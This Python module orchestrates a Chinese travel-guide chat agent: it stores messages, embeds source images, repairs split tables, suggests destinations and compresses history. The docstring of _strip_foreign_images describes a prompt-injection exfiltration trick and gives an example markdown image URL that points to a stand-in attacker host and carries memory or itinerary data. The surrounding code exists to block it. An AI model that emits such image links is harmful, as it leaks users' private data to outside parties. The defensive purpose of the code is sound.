"""Phase 2 对话式攻略生成编排

流程：解析需求 → 拆解搜索任务 → 搜索引擎抓取多来源 → 汇总 → 生成图文攻略
每步向对话追加 progress 消息；最终 assistant 消息带 reasoning（模型思考）与 sources。
多轮修改：已有攻略且目的地不变时，复用已抓来源，只重新生成，不重复搜索。
"""

import asyncio
import json
import logging
import re
import traceback

from pydantic import BaseModel, Field
from sqlalchemy import select

from app.agent import site_router
from app.agent.confirm import ask_confirm, wait_confirm
from app.agent.context_security import (
    CURRENT_REQUEST_POLICY, EXTERNAL_POLICY, HEALTH_POLICY, wrap_external,
)
from app.agent.extract import summarize_page
from app.agent.memory import extract_and_save, gather_context
from app.agent.site_router import (
    SiteTarget,
    collect_via_site,
    handoff_screenshot_path,
    resolve_intent,
    resolve_wants_hotel,
    route_for_intent,
)
from app.config import settings
from app.db.models import TravelConversation, TravelMessage
from app.db.session import get_session
from app.llm.client import get_llm
from app.schemas.chat_schema import Preference, SearchPlan
from app.tools.browser_tool import BrowserTool
from app.tools.mcp_client import ChromeMCP, MCPConnectionError

logger = logging.getLogger(__name__)


# ---------- 消息落库 ----------

def _add_message(cid: str, role: str, content: str, *, reasoning: str | None = None, meta: dict | None = None) -> None:
    with get_session() as db:
        db.add(TravelMessage(
            conversation_id=cid, role=role, content=content,
            reasoning=reasoning, meta_json=json.dumps(meta, ensure_ascii=False) if meta else None,
        ))
        db.commit()


def _progress(cid: str, text: str, meta: dict | None = None) -> None:
    _add_message(cid, "progress", text, meta=meta)


def _queue_cb(cid: str):
    """浏览器池排队时的提示回调（池在独立线程调用，写一条 progress 让用户知道在排队）。"""

    def cb(position: int) -> None:
        if position > 0:
            _progress(cid, f"前面还有 {position} 个任务在用浏览器，正在排队…")
        else:
            _progress(cid, "正在等待浏览器空闲…")

    return cb


def clear_plain_progress(cid: str) -> None:
    """清理本轮的纯叙述性 progress（无 meta），终稿后调用，避免残留在结果下方。

    保留带 meta 的 progress（handoff/confirm 卡片是交互历史）。
    """
    with get_session() as db:
        rows = db.execute(
            select(TravelMessage).where(TravelMessage.conversation_id == cid)
        ).scalars().all()
        last_user_ts = max((m.created_at for m in rows if m.role == "user"), default=None)
        for m in rows:
            if (
                m.role == "progress" and m.meta_json is None
                and (last_user_ts is None or m.created_at >= last_user_ts)
            ):
                db.delete(m)
        db.commit()


# ---------- 流式 assistant 消息（Phase 11） ----------

def _add_streaming_message(cid: str) -> str:
    with get_session() as db:
        m = TravelMessage(
            conversation_id=cid, role="assistant", content="",
            meta_json=json.dumps({"streaming": True}),
        )
        db.add(m)
        db.commit()
        return m.id


def _update_streaming_message(mid: str, content: str, reasoning: str) -> None:
    try:
        with get_session() as db:
            m = db.get(TravelMessage, mid)
            if m is not None:
                m.content = content
                m.reasoning = reasoning or None
                db.commit()
    except Exception:  # noqa: BLE001 — 单次增量落库失败不打断流
        logger.warning("streaming update failed", exc_info=True)


def _finalize_streaming_message(mid: str, content: str, reasoning: str, meta: dict) -> None:
    with get_session() as db:
        m = db.get(TravelMessage, mid)
        if m is None:
            return
        m.content = content
        m.reasoning = reasoning or None
        m.meta_json = json.dumps(meta, ensure_ascii=False) if meta else None
        db.commit()


# ---------- 攻略配图（Phase 12） ----------

from urllib.parse import quote as _urlquote

# 兼容模型写歪的变体：单括号 [img:...]、全角冒号（线上真实出现过单括号原样漏进正文）
_IMG_PLACEHOLDER = re.compile(r"\[\[?img[:：]([^\]]{1,60})\]\]?")

# 模型偶发把工具调用（collect_source 等）以 DeepSeek/Anthropic 标记吐进正文（复杂多城请求时
# 它以为还在工具循环）。正文永远不该有这些 → 从首个标记处截断剥掉（｜为全角 U+FF5C）。
_TOOLCALL_LEAK_RE = re.compile(
    r"<[\s｜|]*(?:DSML|tool[_▁]?calls|function[_▁]?calls)[\s\S]*\Z", re.IGNORECASE
)


def _strip_toolcall_leak(text: str) -> str:
    return _TOOLCALL_LEAK_RE.sub("", text or "").rstrip()


def _build_image_context(sources: list[dict]) -> tuple[dict, str]:
    """聚合来源图片 → (名称→代理URL 映射, prompt 追加块)。无图返回 ({}, "")。

    景点图来自高德、酒店图来自携程、灵感图来自小红书；按名称去重，总量限 10 张。
    """
    seen: set[str] = set()
    spots: list[str] = []
    hotels: list[str] = []
    inspirations: list[str] = []
    image_map: dict[str, str] = {}
    for s in sources:
        for img in s.get("images") or []:
            name, url = img.get("name"), img.get("url")
            if not name or not url or name in seen or len(image_map) >= 10:
                continue
            seen.add(name)
            image_map[name] = f"/travel/api/img?u={_urlquote(url, safe='')}"
            if s.get("site") == "ctrip":
                hotels.append(name)
            elif s.get("site") == "xhs":
                inspirations.append(name)
            else:
                spots.append(name)
    if not image_map:
        return {}, ""
    parts = ["\n\n可插入的图片（在攻略相关位置用 [[img:名称]] 占位符插入，"
             "名称必须与下面完全一致，不要写网址；每个地点/酒店最多插一张。"
             "若清单有 3 张以上，整篇至少分散使用 3 张，避免连续堆图）："]
    if spots:
        parts.append("景点：" + "、".join(spots))
    if hotels:
        parts.append("酒店：" + "、".join(hotels))
    if inspirations:
        parts.append("小红书灵感图（按笔记主题放到相关 Day/章节）：" + "、".join(inspirations))
    return image_map, "\n".join(parts)


# 允许出现在正文里的图片地址前缀：一律走本站代理（/api/img 做了域名白名单 + 重定向复验）
_SAFE_IMG_PREFIXES = ("/travel/api/img", "/api/img", "/travel/api/staticmap", "/api/staticmap")
_MD_IMG_RE = re.compile(r"!\[([^\]]*)\]\(\s*([^)\s]+)[^)]*\)")


def _strip_foreign_images(text: str) -> str:
    """剥掉指向站外的 Markdown 图片（Phase 69 数据外带防护，与 CSP 双保险）。

    攻略正文由 LLM 生成，而 LLM 读过不可信的网页/小红书笔记。注入内容可以诱导模型写出
    `![](https://attacker/x.png?d=<记忆或行程片段>)`——浏览器一渲染就把数据带出去了，
    且完全绕过 img_api 的域名白名单。这里只放行本站代理地址，其余整个图片语法删掉。
    """
    if not text:
        return text

    def _keep(m: "re.Match") -> str:
        url = (m.group(2) or "").strip()
        if url.startswith(_SAFE_IMG_PREFIXES):
            return m.group(0)
        logger.warning("剥离站外图片引用：%s", url[:120])
        return ""

    return _MD_IMG_RE.sub(_keep, text)


def _is_table_line(line: str) -> bool:
    """是否为 Markdown 表格行（含分隔行）。用于插图避让：表格块内插任何东西都会把表格劈开。"""
    return line.lstrip().startswith("|")


_TABLE_SEP = re.compile(r"^\|[\s:|-]+\|")
_MD_IMAGE_LINE = re.compile(r"^!\[[^\]]*\]\([^)]*\)\s*$")


def _is_movable_gap_line(line: str) -> bool:
    """表格块之间的「可搬走」内容：空行、我们插的图片行、图片下面的图注。"""
    s = line.strip()
    return not s or bool(_MD_IMAGE_LINE.match(s)) or s.startswith("*图源")


def _rejoin_split_tables(text: str) -> str:
    """把被插图劈成两截的表格重新接上（2026-08-04 线上复发）。

    前面几处插入点都各自做了「避开表格块」，但**避不干净**：只要表格中间出现一个空行
    （模型自己写的，或某个插入点留下的），后半截行就不再被 `_is_table_line` 的连续性
    判定视作同一块，图片正好落进缝里。结果是表头/分隔行留在上半截，下半截退化成裸
    `| … |` 文本——正是 evals 的 `broken_table` 抓到的形态。

    与其在每个插入点继续打补丁，不如**最后统一收口**：识别「表格块 → 空行/图片 →
    没有分隔行的表格行」这个形态，把中间的图片搬到整张表之后，续行并回表格块。
    这同时修掉了模型自己在表格中间写空行的情况（那种情况插入点是无辜的）。

    真正的新表格（第二行是 `|---|` 分隔行）不会被合并。
    """
    lines = text.split("\n")
    out: list[str] = []
    i, n = 0, len(lines)
    while i < n:
        if not _is_table_line(lines[i]):
            out.append(lines[i])
            i += 1
            continue
        block: list[str] = []
        while i < n and _is_table_line(lines[i]):
            block.append(lines[i])
            i += 1
        moved: list[str] = []
        while True:  # 可能被劈成多截，反复接
            j = i
            while j < n and _is_movable_gap_line(lines[j]):
                j += 1
            is_orphan = (
                j < n and j > i and _is_table_line(lines[j])
                and not _TABLE_SEP.match(lines[j].lstrip())
                and (j + 1 >= n or not _TABLE_SEP.match(lines[j + 1].lstrip()))
            )
            if not is_orphan:
                break
            moved += [ln for ln in lines[i:j] if ln.strip()]
            while j < n and _is_table_line(lines[j]):
                block.append(lines[j])
                j += 1
            i = j
        out.extend(block)
        if moved:
            out.extend(["", *moved, ""])
    return "\n".join(out)


def _sub_placeholders_table_safe(text: str, image_map: dict) -> str:
    """替换 [[img:名称]] 占位符，且**表格安全**：表格行内的占位符从行里剥掉、
    对应图片推迟到该表格块结束后插入（线上踩坑：模型把占位符写进表格单元格，
    或兜底插图插进表格行之间，表格从中间断成裸文本）。"""
    out_lines: list[str] = []
    pending: list[str] = []  # 表格内占位符对应的图片，等表格结束再插

    def repl(m: "re.Match") -> str:
        name = m.group(1).strip()
        url = _match_image(name, image_map)
        return f"\n\n![{name}]({url})\n\n" if url else ""

    def repl_defer(m: "re.Match") -> str:
        name = m.group(1).strip()
        url = _match_image(name, image_map)
        if url:
            pending.append(f"![{name}]({url})")
        return ""

    for line in text.split("\n"):
        if _is_table_line(line):
            out_lines.append(_IMG_PLACEHOLDER.sub(repl_defer, line))
            continue
        if pending:  # 刚离开表格块 → 先把推迟的图插进来
            out_lines.extend(["", *pending, ""])
            pending = []
        out_lines.append(_IMG_PLACEHOLDER.sub(repl, line))
    if pending:
        out_lines.extend(["", *pending])
    return "\n".join(out_lines)


def _embed_images(text: str, image_map: dict, streaming: bool = False) -> str:
    """把 [[img:名称]] 占位符替换为 Markdown 图片；终稿时对未用图做标题/列表行兜底插入。

    - 占位符替换：精确→包含匹配，匹配不到删占位符（模型主动配图，位置自然）。
    - streaming=True：额外剥掉行尾未闭合的 `[[img:` 残片，避免流式闪烁，不做兜底。
    - streaming=False：对仍未使用的图，在首个「醒目提及该名称」的行（标题/加粗/
      列表项）后插入——保证酒店（每家一个 ### 标题）等一定有配图，即使模型没插占位符。
    - 所有插入一律避开表格块内部（见 _sub_placeholders_table_safe）。
    """
    if not text:
        return text
    text = _strip_toolcall_leak(text)  # 剥掉泄漏的工具调用标记（流式/终稿都过一遍）

    out = _sub_placeholders_table_safe(text, image_map)
    # 先剥站外图（模型自己写的 markdown 图片不经占位符，必须单独处理），
    # 放在占位符替换之后：我们自己插的代理地址在白名单内不受影响。
    out = _strip_foreign_images(out)
    if streaming:
        return re.sub(r"\[\[?img[:：][^\]]*$", "", out)  # 行尾未闭合残片

    # 终稿兜底 1：地点/酒店图插到醒目提及处。命中行在表格内时推迟到表格结束后插。
    used = {url for url in image_map.values() if url in out}
    remaining = [(n, u) for n, u in image_map.items() if u not in used]
    if not remaining:
        return _rejoin_split_tables(out)
    lines = out.split("\n")
    result: list[str] = []
    deferred: list[str] = []  # 表格行里命中的图，等表格结束再插
    for line in lines:
        if deferred and not _is_table_line(line):
            result.extend(["", *deferred, ""])
            deferred = []
        result.append(line)
        for name, url in remaining[:]:
            if url in used or name not in line:
                continue
            if _is_prominent_line(line, name):
                if _is_table_line(line):
                    deferred.append(f"![{name}]({url})")
                else:
                    result.append(f"\n![{name}]({url})\n")
                used.add(url)
                remaining.remove((name, url))
                break
    if deferred:
        result.extend(["", *deferred])
    out = "\n".join(result)

    # 终稿兜底 2：小红书图片名通常是笔记标题，不一定在正文逐字出现。模型漏用时，
    # 把最多 5 张分散到不同二/三级标题后，五日内行程可做到每天至少一张。
    # 图下带可见图注标明「图源：小红书笔记」——灵感图画的可能是笔记作者的路线
    # （与本攻略当日安排不同），不注明会显得攻略自相矛盾（走查 P2-a）。
    remaining_inspirations = [
        (name, url) for name, url in remaining
        if name.startswith("小红书灵感·") and url not in used
    ][:5]
    if not remaining_inspirations:
        return _rejoin_split_tables(out)
    lines = out.split("\n")
    result = []
    inserted = 0
    for line in lines:
        result.append(line)
        if inserted >= len(remaining_inspirations) or not re.match(r"^#{2,3}\s+\S", line.strip()):
            continue
        name, url = remaining_inspirations[inserted]
        label = name.removeprefix("小红书灵感·").rsplit("·", 1)[0]
        result.append(f"\n![小红书灵感图｜{label}]({url})\n*图源：小红书笔记「{label}」*\n")
        used.add(url)
        inserted += 1
    return _rejoin_split_tables("\n".join(result))


def _match_image(name: str, image_map: dict) -> str | None:
    if not name:
        return None
    if name in image_map:
        return image_map[name]
    for k, v in image_map.items():  # 包含匹配兜底
        if name in k or k in name:
            return v
    return None


def _waypoint_directive(pref) -> str:
    """沿途中转轮的生成指令（纯函数可测）。非 waypoint 轮返回空串。

    system prompt 保持静态吃 KV 缓存，本指令走 extra_user 末置（同 credibility_directive）。
    """
    if not getattr(pref, "waypoint_trip", False):
        return ""
    origin = (pref.origin or "出发地").strip() or "出发地"
    dest = (pref.destination or "终点").strip() or "终点"
    return (
        f"【本轮是沿途中转推荐：{origin} → {dest}】"
        f"用户要的是路上停哪，不是 {dest} 的城市攻略。硬性要求：\n"
        f"1. 只推荐**顺路**的停留点——必须位于 {origin} 前往 {dest} 的行进方向上，"
        f"明显折返或在 {dest} 更远一侧的地点一律不要；\n"
        f"2. 每个候选标注距 {origin} 和 {dest} 的大致车程（参考资料/坐标，没有就按常识估算并注明约）；\n"
        f"3. 正文围绕中途停留组织：候选对比（顺路程度/停留时长/适合谁）→ 推荐方案 → "
        f"到 {dest} 的衔接建议；不要展开写 {dest} 城内行程。"
    )


def _is_prominent_line(line: str, name: str) -> bool:
    """该行是否「醒目地」提及名称：标题 / 加粗 / 列表项 / 独占一行。"""
    stripped = line.strip()
    if stripped.startswith("#"):
        return True
    if f"**{name}" in line or f"{name}**" in line:
        return True
    if re.match(r"^\s*(\d+[.、)]|[-*+])\s", line) and name in line:
        return True
    return stripped == name


# 解析模型偶发把目的地填成占位词（真实踩坑：「热门目的地」拿去搜出游戏官网垃圾）
_DEST_PLACEHOLDERS = {"热门目的地", "目的地", "附近", "周边", "当地", "国内", "未知", "待定", "不确定"}


def _normalize_destination(dest: str | None) -> str:
    """目的地归一（纯函数可测）：剥空白；占位词一律视为空（触发反问）。"""
    d = (dest or "").strip()
    return "" if d in _DEST_PLACEHOLDERS else d


def _web_search_mode(xhs_count: int) -> str:
    """按小红书收成决定必应档位（纯函数可测）：skip（足够，直接跳过）/ light（1查询4页）/ full。"""
    if xhs_count >= settings.xhs_skip_search_min:
        return "skip"
    if xhs_count >= settings.xhs_min_for_light_search:
        return "light"
    return "full"


def _is_clarify_text(text: str | None) -> bool:
    """是否为澄清式短问句（≤60 字、问号结尾）。纯函数，供延续判定与追问计数共用。"""
    t = (text or "").strip()
    return 0 < len(t) <= 60 and t.endswith(("？", "?"))


def _recent_clarify_rounds(cid: str) -> int:
    """会话末尾**连续**的追问轮数（Phase 68 熔断用）。

    只看 assistant 正文消息（跳过 progress/action 与流式占位/海报/预算面板），
    从最新一条往回数，遇到第一条非追问就停。判定失败返回 0（宁可不熔断）。
    """
    try:
        with get_session() as db:
            rows = db.execute(
                select(TravelMessage)
                .where(TravelMessage.conversation_id == cid,
                       TravelMessage.role == "assistant")
                .order_by(TravelMessage.created_at.desc())
                .limit(8)
            ).scalars().all()
        n = 0
        for m in rows:
            meta = {}
            if m.meta_json:
                try:
                    meta = json.loads(m.meta_json) or {}
                except Exception:  # noqa: BLE001
                    meta = {}
            if meta.get("streaming") or meta.get("poster") or meta.get("budget"):
                continue  # 占位/面板类消息不算一轮对话
            # 候选卡（Phase 76）也是一次「没给结果、把球踢回去」，必须计入熔断。
            # 否则连续给候选永远不触发强制代选，就是换了张皮的无限追问。
            if meta.get("candidates"):
                n += 1
                continue
            if not _is_clarify_text(m.content):
                break
            n += 1
        return n
    except Exception:  # noqa: BLE001
        logger.warning("clarify rounds count failed", exc_info=True)
        return 0


class _DestPick(BaseModel):
    """追问熔断时让模型代选的目的地。"""

    destination: str = Field(default="", description="一个具体真实的城市/景区名，不确定就留空")


DECIDE_DEST_SYSTEM = (
    "你要替用户拍板选一个旅行目的地。用户要么明确说了「你决定/随便/挑个热门的」，"
    "要么已经被反复追问仍未给出具体地名——**现在必须给出一个答案，不能再问**。\n"
    "规则：优先从对话历史里助手列过的候选中挑最热门、最符合用户已表达约束"
    "（方向、风格、天数、出发地）的一个；历史没有候选就按约束自己挑一个知名目的地。\n"
    "destination 必须是具体真实地名（如「六安」「九江」），"
    "**绝不能**填「热门目的地」「附近」这类占位词。实在无从判断才留空。"
)


class _DestCandidate(BaseModel):
    name: str = Field(default="", description="具体真实的城市/景区名，如「池州」「天堂寨」")
    reason: str = Field(default="", description="一句话说明为什么适合这个用户，≤30 字")
    tag: str = Field(default="", description="4 字以内的标签，如「山水清凉」「古镇慢逛」")


class _DestCandidates(BaseModel):
    """区域型提问的候选目的地（Phase 76）。"""

    candidates: list[_DestCandidate] = Field(default_factory=list)


SUGGEST_DEST_SYSTEM = (
    "用户想出去玩，但只给了一个**大范围**（如「合肥周边」「皖南」「川西」）或者压根没说去哪。"
    "不要反问他「想去哪个城市」——那是把问题原样丢回去。**直接给 3 个候选目的地**，"
    "让他点一下就能继续。\n"
    "规则：\n"
    "1. name 必须是**具体真实**的城市/景区名，且确实落在用户说的范围内、"
    "从用户出发地当天或周末可达；绝不能填「热门目的地」「周边」这类占位词。\n"
    "2. 三个候选要**互相有区分度**（比如一个山水、一个古镇、一个小众），"
    "不要给三个几乎一样的地方。\n"
    "3. reason 一句话说清「为什么适合这个用户」，要贴合他已说的约束"
    "（天数、自驾与否、同行、偏好），不要写通用广告词。\n"
    "4. 拿不准就少给，宁可 2 个准的，不要 3 个凑数的。完全无从判断就返回空列表。"
)


def _suggest_destinations(llm, history: str, user_text: str) -> list[dict]:
    """区域型提问 → 候选目的地列表（快模型，无浏览器，秒级）。

    产品决策：**只列候选、等用户选**，不直接按最推荐的那个出完整攻略。
    候选 10 秒内就能返回，而完整攻略要 2-15 分钟；在用户还没确认方向时先跑几分钟，
    猜错就是纯浪费，猜对也让人觉得「它没问我就自作主张」。

    任何失败返回 []，调用方回落到原来的文字反问。
    """
    try:
        r = llm.parse(
            f"对话历史：\n{history}\n\n用户最新输入：{user_text}",
            _DestCandidates, model=settings.model_classifier, system=SUGGEST_DEST_SYSTEM,
        )
    except Exception:  # noqa: BLE001 — 候选是增强，失败回落反问
        logger.warning("destination candidates failed", exc_info=True)
        return []

    out: list[dict] = []
    for c in r.candidates or []:
        # 占位词必须挡在这里：候选会被原样当成下一轮的目的地送进搜索链路
        name = _normalize_destination(c.name)
        if not name or any(x["name"] == name for x in out):
            continue
        out.append({"name": name, "reason": (c.reason or "").strip()[:40],
                    "tag": (c.tag or "").strip()[:8]})
    return out[:3]


def _decide_destination(llm, history: str, user_text: str) -> str:
    """追问熔断/用户授权时代选一个目的地；选不出返回 ""（调用方回落反问）。"""
    try:
        r = llm.parse(
            f"对话历史：\n{history}\n\n用户最新输入：{user_text}",
            _DestPick, model=settings.model_classifier, system=DECIDE_DEST_SYSTEM,
        )
        return _normalize_destination(r.destination)
    except Exception:  # noqa: BLE001 — 代选是增强，失败回落反问
        logger.warning("destination auto-pick failed", exc_info=True)
        return ""


def _is_clarify_continuation(cid: str) -> bool:
    """上一条 assistant 是否为澄清式短问句（≤60字、问号结尾）→ 本轮是它的回答。

    这类轮次（「玩几天？」→「10天」）必须延续 guide 流水线，不能进三路分类器
    （分类器只看本条文本，短回答必被误判 direct）。判定失败一律 False（走正常分类）。
    """
    try:
        with get_session() as db:
            last = db.execute(
                select(TravelMessage)
                .where(TravelMessage.conversation_id == cid,
                       TravelMessage.role.in_(("user", "assistant")))
                .order_by(TravelMessage.created_at.desc())
                .limit(2)
            ).scalars().all()
        # 本轮 user 消息已落库 → last[0]=本轮user, last[1]=上一条assistant
        prev = next((m for m in last if m.role == "assistant"), None)
        if prev is None:
            return False
        return _is_clarify_text(prev.content)
    except Exception:  # noqa: BLE001
        logger.warning("clarify-continuation check failed", exc_info=True)
        return False


def _history_text(cid: str, rounds: int | None = None) -> str:
    """取对话历史：近 N 轮**逐字**（默认 settings.history_rounds=5 轮）+ 更早轮次的
    结构化摘要（Phase 30 分段压缩：摘要在轮末旁路生成，见 update_history_summary）。"""
    limit = (rounds or settings.history_rounds) * 2
    with get_session() as db:
        msgs = db.execute(
            select(TravelMessage)
            .where(TravelMessage.conversation_id == cid, TravelMessage.role.in_(("user", "assistant")))
            .order_by(TravelMessage.created_at.desc())
            .limit(limit)
        ).scalars().all()
        conv = db.get(TravelConversation, cid)
        summary = (conv.history_summary or "").strip() if conv else ""
    msgs = list(reversed(msgs))
    recent = "\n".join(f"{'用户' if m.role == 'user' else '助手'}：{m.content[:500]}" for m in msgs)
    if summary:
        return f"【早前对话要点（已折叠）】\n{summary}\n\n【最近对话】\n{recent}"
    return recent


def _full_history_messages(cid: str) -> list[dict]:
    """全量对话历史 → 真实交替角色消息，**逐字不截断**（Phase 33，深度研究跨轮上下文）。

    与 `_history_context`（近 5 轮 + 每条截 500 字）的区别：这里保留完整报告全文，
    历史是 append-only 的——下一轮的消息前缀 = 上一轮前缀 + 上轮问答，DeepSeek
    自动前缀缓存可跨轮命中。超长防线在调用方（超 deep_research_history_max_chars
    回退窄窗形态）。
    """
    with get_session() as db:
        rows = db.execute(
            select(TravelMessage)
            .where(TravelMessage.conversation_id == cid, TravelMessage.role.in_(("user", "assistant")))
            .order_by(TravelMessage.created_at)
        ).scalars().all()
    return [
        {"role": m.role, "content": m.content or ""}
        for m in rows if (m.content or "").strip()
    ]


def _assemble_history(cid: str, current_user_text: str = "") -> tuple[list[dict], str]:
    """全文历史装配（Phase 34，direct/guide 与研究链路对齐）：

    - 未超 `history_full_max_chars`：全量历史**逐字**注入（追问「解释上一轮推荐」
      能看到长攻略全文），摘要为空；
    - 超限：近 `history_rounds` 轮逐字保留 + 更早轮次用 Phase 30 结构化摘要——
      即 Claude Code 分段压缩的「recent verbatim + 旧前缀摘要」形态（autocompact
      的装配期对应物；microcompact 无对应项：跨轮历史只有终稿，来源原文轮末已蒸馏）。

    返回 (历史消息, 摘要文本)；与本轮重复的落库用户消息去重。
    """
    msgs = _full_history_messages(cid)
    if current_user_text and msgs and msgs[-1]["role"] == "user" \
            and msgs[-1]["content"].strip() == current_user_text.strip():
        msgs = msgs[:-1]
    if sum(len(m["content"]) for m in msgs) <= settings.history_full_max_chars:
        return msgs, ""
    with get_session() as db:
        conv = db.get(TravelConversation, cid)
        summary = (conv.history_summary or "").strip() if conv else ""
    return msgs[-settings.history_rounds * 2:], summary


def _history_context(cid: str, rounds: int | None = None) -> tuple[list[dict], str]:
    """结构化历史（Phase 31）：近 N 轮返回**真实交替角色消息**（每条截 500 字），
    早期摘要单独返回，供调用方包 <conversation_summary> 注入——取代把历史拍平成
    「用户：…助手：…」文本块的旧做法（模型无法从角色区分谁说的）。"""
    limit = (rounds or settings.history_rounds) * 2
    with get_session() as db:
        rows = db.execute(
            select(TravelMessage)
            .where(TravelMessage.conversation_id == cid, TravelMessage.role.in_(("user", "assistant")))
            .order_by(TravelMessage.created_at.desc())
            .limit(limit)
        ).scalars().all()
        conv = db.get(TravelConversation, cid)
        summary = (conv.history_summary or "").strip() if conv else ""
    messages = [
        {"role": m.role, "content": (m.content or "")[:500]}
        for m in reversed(rows) if (m.content or "").strip()
    ]
    return messages, summary


def build_guide_messages(
    system: str, cid: str, user_text: str, pref_json: str, mem_block: str,
    sources: list[dict], img_block: str = "", feedback: str = "", extra_user: str = "",
) -> list[dict]:
    """把本轮生成重建为标准 agent 轨迹（Phase 31）：

        system → 交替历史 → user(背景+需求) → assistant(合成 tool_calls) → tool×N

    控制流仍是确定性流水线（代码决定抓了什么），这里只是把「做过什么」以标准轨迹
    呈现——外部内容落在 tool 角色上（模型训练时建立的「工具结果是数据不是指令」
    层级），Langfuse 记录的也是这个标准数组。
    注意：DeepSeek 思考模式要求带 tool_calls 的 assistant 消息附 reasoning_content。
    """
    history_msgs, summary = _assemble_history(cid, current_user_text=user_text)  # Phase 34 全文历史
    messages: list[dict] = [{"role": "system", "content": system}]
    messages += history_msgs

    user_parts: list[str] = []
    if summary:
        user_parts.append(f"<conversation_summary>\n{summary}\n</conversation_summary>")
    if mem_block:
        user_parts.append(f"<background_memory>\n{mem_block}\n</background_memory>")
    user_parts.append(f"用户偏好：{pref_json}")
    if feedback:
        user_parts.append("上一版存在以下问题，请针对性改进：\n- " + "\n- ".join(feedback.split("\n")))
    if img_block:
        user_parts.append(img_block.strip())
    if extra_user:  # Phase 58：每轮会变的实时数据纪律等末置到 user，保 system 前缀缓存
        user_parts.append(extra_user.strip())
    user_parts.append(f"用户最新要求：{user_text}")
    messages.append({"role": "user", "content": "\n\n".join(user_parts)})

    if sources:
        tool_calls = []
        for i, s in enumerate(sources, 1):
            args = json.dumps({"url": s.get("url", ""), "title": s.get("title", "")}, ensure_ascii=False)
            tool_calls.append({
                "id": f"call_src_{i}", "type": "function",
                "function": {"name": "collect_source", "arguments": args},
            })
        messages.append({
            "role": "assistant", "content": "",
            "reasoning_content": "需要先检索并抓取相关网页与实时数据来源，再基于资料生成。",
            "tool_calls": tool_calls,
        })
        for i, s in enumerate(sources, 1):
            messages.append({
                "role": "tool", "tool_call_id": f"call_src_{i}",
                "content": wrap_external(
                    s.get("summary", ""), url=s.get("url", ""), title=s.get("title", ""),
                ),
            })
        # 复杂多城请求时模型易「觉得资料不够、继续调工具」→ 工具调用标记泄漏进正文。
        # 明确收尾：资料到此为止、直接产出、禁止任何工具/函数调用格式。
        messages.append({
            "role": "user",
            "content": "以上是本轮**全部**可用参考资料，你已无法再检索或调用任何工具。"
                       "请直接综合它们输出完整攻略：覆盖到的城市就写，资料不足的城市如实说明或"
                       "标注「资料有限，建议到当地再核实」，**绝不要输出任何工具调用/函数调用格式"
                       "（collect_source、tool_calls、invoke、DSML 标记等一律不许出现）**，直接写正文。",
        })
    return messages


HISTORY_SUMMARY_SYSTEM = (
    "把一段旅行助手的早期对话历史压缩成后续轮次要用的要点备忘，固定四个小节输出"
    "（没有内容的小节写「无」）：\n"
    "## 用户约束\n预算/日期/人数/出行方式/口味等硬约束\n"
    "## 已确认的决定\n已敲定的目的地、酒店、行程安排\n"
    "## 已排除的选项\n用户明确否掉的方案（连同原因，避免后续重复推荐）\n"
    "## 待跟进\n提过但还没落实的事项\n"
    "只保留对后续规划有用的信息，丢弃寒暄与攻略正文细节。总长不超过 400 字。"
)

_HISTORY_SUMMARY_MAX_MSGS = 60  # 极长会话只折叠最早 60 条，再早的信息价值递减


def update_history_summary(cid: str) -> None:
    """轮末旁路：把近 N 轮之外的早期消息折叠成结构化摘要，整体覆盖存进会话行。

    与记忆提炼同时机（回复已生成，不加轮内延迟）；每轮全量重写（幂等，避免增量拼接
    漂移）；失败只记日志——摘要是增强，不能影响主链路。
    """
    from app.llm.client import get_llm

    keep = settings.history_rounds * 2
    try:
        with get_session() as db:
            msgs = db.execute(
                select(TravelMessage)
                .where(TravelMessage.conversation_id == cid,
                       TravelMessage.role.in_(("user", "assistant")))
                .order_by(TravelMessage.created_at)
            ).scalars().all()
            conv = db.get(TravelConversation, cid)
            if conv is None or len(msgs) <= keep:
                return  # 短会话：近窗装得下，不折叠
            if len(msgs) == (conv.history_summary_count or 0):
                return  # 没有新消息落出近窗，摘要还新鲜
            old = msgs[:-keep][:_HISTORY_SUMMARY_MAX_MSGS]
            listing = "\n".join(
                f"{'用户' if m.role == 'user' else '助手'}：{(m.content or '')[:300]}" for m in old
            )

            from pydantic import BaseModel

            class _Summary(BaseModel):
                summary: str

            r = get_llm().classify(listing, _Summary, system=HISTORY_SUMMARY_SYSTEM)
            if (r.summary or "").strip():
                conv.history_summary = r.summary.strip()[:2000]
                conv.history_summary_count = len(msgs)
                db.commit()
    except Exception:  # noqa: BLE001
        logger.warning("history summary update failed for %s", cid, exc_info=True)


def _last_sources_and_dest(cid: str) -> tuple[list[dict], str]:
    """取最近一条带 sources 的 assistant 消息的 (sources, 当时的目的地)（多轮修改复用）"""
    with get_session() as db:
        msgs = db.execute(
            select(TravelMessage)
            .where(TravelMessage.conversation_id == cid, TravelMessage.role == "assistant")
            .order_by(TravelMessage.created_at.desc())
        ).scalars().all()
    for m in msgs:
        if m.meta_json:
            meta = json.loads(m.meta_json)
            if meta.get("sources"):
                dest = (meta.get("preference") or {}).get("destination") or ""
                return meta["sources"], dest
    return [], ""


def _is_hotel_source(s: dict) -> bool:
    return s.get("site") == "ctrip" or "酒店" in (s.get("title") or "")


def decide_revision(
    existing_sources: list[dict], last_dest: str, dest: str, intent: str,
    wants_hotel: bool | None = None,
) -> bool:
    """多轮修改判定：目的地没换，且已有来源类型能覆盖本轮全部需求，才复用来源跳过搜索。

    酒店需求（主意图 hotel 或复合需求带酒店）要求已有酒店类来源；
    路线/攻略意图要求已有非酒店（攻略类）来源——两者都要满足才复用，
    否则（如先查酒店再要行程规划、先出攻略再追问酒店）必须重新走站点路由 + 搜索。
    """
    from app.agent.site_router import split_cities

    # 目的地按**城市集合**比，不按字符串相等：模型下一轮可能把「吉隆坡、仙本那」
    # 写成「仙本那、吉隆坡」，字符串比较会误判成换了目的地 → 无谓重搜（2026-08-01）。
    same_dest = bool(last_dest) and bool(dest) and set(split_cities(last_dest)) == set(split_cities(dest))
    if not same_dest:
        return False
    hotel_srcs = [s for s in existing_sources if _is_hotel_source(s)]
    guide_srcs = [s for s in existing_sources if not _is_hotel_source(s)]
    needs_hotel = wants_hotel if wants_hotel is not None else intent == "hotel"
    hotel_ok = bool(hotel_srcs) if needs_hotel else True
    guide_ok = bool(guide_srcs) if intent != "hotel" else True
    return hotel_ok and guide_ok


_IMAGE_REFRESH_RE = re.compile(r"(补.{0,4}图|图片|配图|图文|含图|照片|实景图)")


def wants_image_refresh(user_text: str) -> bool:
    """用户是否明确要求给已有内容补图片；不把普通“拍照机位”误判成补图。"""
    return bool(_IMAGE_REFRESH_RE.search(user_text or ""))


